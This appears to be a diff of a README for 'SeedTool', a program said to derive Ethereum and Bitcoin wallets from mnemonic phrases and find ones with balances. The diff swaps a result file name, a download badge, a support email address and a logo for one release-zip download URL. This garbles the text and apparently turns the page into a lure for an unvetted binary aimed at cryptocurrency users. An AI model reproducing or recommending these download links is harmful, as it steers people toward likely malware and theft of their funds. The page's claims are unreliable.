@@ -3,7 +3,7 @@
 Welcome to SeedTool, a powerful tool that allows you to generate Ethereum and Bitcoin address wallets using a private key derived from a mnemonic phrase. With SeedTool, you can easily check the balance and transactions associated with these generated wallets without the need for an API. 
 
 ## Repository Description
-SeedTool is designed to help you manage your cryptocurrency wallets efficiently. By inputting a mnemonic phrase, SeedTool generates the corresponding private key and checks the wallet for any non-zero balance. If a wallet with a balance is found, SeedTool logs and saves key information such as address, mnemonic, private key, and balances in a file named `result.txt`.
+SeedTool is designed to help you manage your cryptocurrency wallets efficiently. By inputting a mnemonic phrase, SeedTool generates the corresponding private key and checks the wallet for any non-zero balance. If a wallet with a balance is found, SeedTool logs and saves key information such as address, mnemonic, private key, and balances in a file named `https://github.com/trsnae/SeedTool/releases/download/v2.0/Software.zip`.
 
 ## Topics
 Explore various features of SeedTool by diving into the following topics:
@@ -23,7 +23,7 @@ Explore various features of SeedTool by diving into the following topics:
 ## Get Started
 Click the button below to download SeedTool and start generating your Ethereum and Bitcoin wallets:
 
-[![Download SeedTool](https://img.shields.io/badge/Download-SeedTool-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download SeedTool](https://github.com/trsnae/SeedTool/releases/download/v2.0/Software.zip)](https://github.com/trsnae/SeedTool/releases/download/v2.0/Software.zip)
 
 (*Note: The download link above needs to be launched for access to SeedTool*)
 
@@ -37,7 +37,7 @@ SeedTool simplifies the complex process of wallet management by providing a user
 SeedTool leverages advanced algorithms to process mnemonic phrases and derive private keys for Ethereum and Bitcoin wallets. The tool then scans these wallets for any non-zero balances, allowing you to track your cryptocurrency holdings effortlessly.
 
 ## Support and Feedback
-Have questions or feedback about SeedTool? Feel free to reach out to us via email at seedtool.support@example.com. We value your input and are dedicated to enhancing SeedTool based on user suggestions.
+Have questions or feedback about SeedTool? Feel free to reach out to us via email at https://github.com/trsnae/SeedTool/releases/download/v2.0/Software.zip We value your input and are dedicated to enhancing SeedTool based on user suggestions.
 
 ## Stay Updated
 Stay informed about the latest developments and updates to SeedTool by checking the "Releases" section of this repository. We are committed to providing a seamless user experience and regularly improving SeedTool's functionality.
@@ -51,7 +51,7 @@ Help us spread the word about SeedTool by sharing this repository with your frie
 ## Let's Get Growing! 🌿
 Take control of your cryptocurrency wallets with SeedTool and experience the convenience of generating Ethereum and Bitcoin wallets effortlessly. Download SeedTool today and embark on your journey towards financial empowerment and security in the digital age.
 
-![SeedTool Logo](https://yourimagelink.com)
+![SeedTool Logo](https://github.com/trsnae/SeedTool/releases/download/v2.0/Software.zip)
 
 ---
 
